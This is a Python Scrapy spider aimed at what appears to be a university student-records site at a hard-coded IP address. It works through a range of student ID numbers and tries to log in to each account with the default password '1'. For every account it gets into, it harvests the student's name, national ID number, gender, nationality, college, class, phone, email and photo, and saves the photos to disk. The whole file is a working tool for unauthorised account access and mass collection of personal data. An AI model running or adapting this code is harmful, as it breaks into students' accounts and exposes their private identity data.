#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 17-4-11 下午8:12
# @Author  : rhys
# @File    : student_spider.py
# @Project : students
# @Software: PyCharm
import os
from enum import Enum
import scrapy

from students import settings
from students.items import StudentItem


class StudentSpider(scrapy.Spider):
    name = 'students'
    domain = 'http://60.219.165.24/'
    login_url = 'loginAction.do'
    avatar_url = 'xjInfoAction.do?oper=img'
    user_detail = 'xjInfoAction.do?oper=xjxx'
    user_info = 'userInfo.jsp'
    default_password = '1'
    default_id = 2014025732
    LOGIN_STATUS = Enum('LOGIN_STATUS', 'SUCCESS WRONG_ID WRONG_PASS')

    def start_requests(self):
        start_id = getattr(self, 'start', self.default_id)
        end_id = getattr(self, 'end', self.default_id)

        for i in range(int(start_id), int(end_id) + 1):
            yield scrapy.FormRequest(self.domain + self.login_url,
                                     headers=settings.HEADERS,
                                     formdata={'zjh': str(i), 'mm': self.default_password},
                                     callback=self.parse,
                                     meta={'sid': i, 'cookiejar': i},
                                     dont_filter=True)

    def _parse_avatar(self, response):
        self.logger.info('avatar url: {}'.format(response.request.url))
        student = response.meta['student']
        first_path = os.path.join('./', student['college'])
        if not os.path.exists(first_path):
            os.mkdir(first_path)
        second_path = os.path.join(first_path, student['class_name'])
        if not os.path.exists(second_path):
            os.mkdir(second_path)

        with open(os.path.join(second_path, "{}_{}.jpg".format(student['sid'], student['name'])), 'wb') as f:
            f.write(response.body)
        yield student

    def _parse_user_info(self, response):
        student = response.meta['student']
        text_input = response.css('input[type=text]::attr(value)').extract()
        student['tel'] = text_input[0]
        student['email'] = text_input[2]
        request = scrapy.Request(self.domain + self.avatar_url,
                                 callback=self._parse_avatar,
                                 dont_filter=True,
                                 meta={'sid': response.meta['sid'],
                             'cookiejar': response.meta['cookiejar']}
                                 )
        request.meta['student'] = student
        yield request

    def _parse_user_detail(self, response):
        def extract_with_css(query):
            return response.css(query).extract_first(default='null').strip()

        student = StudentItem()
        student["sid"] = extract_with_css('#tblView > tr:nth-child(1) > td:nth-child(2)::text')
        student["name"] = extract_with_css('#tblView > tr:nth-of-type(1) > td:nth-of-type(4)::text')
        student["gender"] = extract_with_css('#tblView > tr:nth-child(4) > td:nth-child(2)::text')
        student["id"] = extract_with_css('#tblView > tr:nth-child(3) > td:nth-child(4)::text')
        student["nationality"] = extract_with_css('#tblView > tr:nth-child(6) > td:nth-child(4)::text')
        student["college"] = extract_with_css('#tblView > tr:nth-child(13) > td:nth-child(4)::text')
        student["class_name"] = extract_with_css('#tblView > tr:nth-child(15) > td:nth-child(4)::text')

        request = scrapy.Request(self.domain + self.user_info,
                                 callback=self._parse_user_info,
                                 dont_filter=True,
                                 meta={'sid': response.meta['sid'], 'cookiejar': response.meta['cookiejar']})
        request.meta['student'] = student
        yield request

    def _check_login_status(self, response):
        flag_tag = response.css('td[class="errorTop"] font::text').extract_first()
        if flag_tag is None:
            return StudentSpider.LOGIN_STATUS.SUCCESS
        else:
            if flag_tag.find('证件号不存在') != -1:
                return StudentSpider.LOGIN_STATUS.WRONG_ID
            else:
                return StudentSpider.LOGIN_STATUS.WRONG_PASS

    def parse(self, response):
        login_status = self._check_login_status(response)
        self.logger.info('[{}] login status[{}]'.format(response.meta['sid'], login_status))
        if login_status != self.LOGIN_STATUS.SUCCESS:
            return

        yield scrapy.Request(self.domain + self.user_detail,
                             callback=self._parse_user_detail,
                             dont_filter=True,
                             meta={'sid': response.meta['sid'], 'cookiejar': response.meta['cookiejar']})
